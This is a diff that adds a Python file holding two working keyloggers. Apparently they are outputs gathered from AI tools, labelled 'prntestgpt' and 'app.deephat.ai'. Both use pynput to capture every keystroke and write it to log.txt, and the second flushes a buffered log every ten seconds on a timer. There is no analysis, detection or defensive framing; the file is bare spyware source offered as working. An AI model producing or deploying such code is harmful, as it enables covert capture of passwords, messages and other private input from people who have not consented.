@@ -1,0 +1,67 @@
+#prntestgpt //this is good
+import pynput.keyboard
+import threading
+
+# Callback function to handle key presses
+def callback_function(key):
+    try:
+        # Try to get the character representation of the key
+        key_str = key.char
+    except AttributeError:
+        # Handle special keys (like Shift, Ctrl, etc.)
+        key_str = f"[{key}]"
+
+    # Write the key to the log file
+    with open("log.txt", "a") as log_file:
+        log_file.write(key_str)
+
+# Create the keyboard listener
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+
+# Start the listener in a separate thread
+keylogger_listener.start()
+
+# Keep the program running
+try:
+    keylogger_listener.join()
+except KeyboardInterrupt:
+    print("\nKeylogger stopped.")
+
+
+
+
+# app.deephat.ai
+import pynput.keyboard
+import threading
+
+log = ""
+
+def callback_function(key):
+    global log
+    try:
+        log += str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        else:
+            log += " [" + str(key) + "] "
+
+def save_log():
+    global log
+    with open("log.txt", "a") as f:
+        f.write(log)
+        log = ""
+    timer = threading.Timer(10, save_log)
+    timer.start()
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+
+with keylogger_listener:
+    save_log()
+    keylogger_listener.join()
+
+#
+
+
+
+//
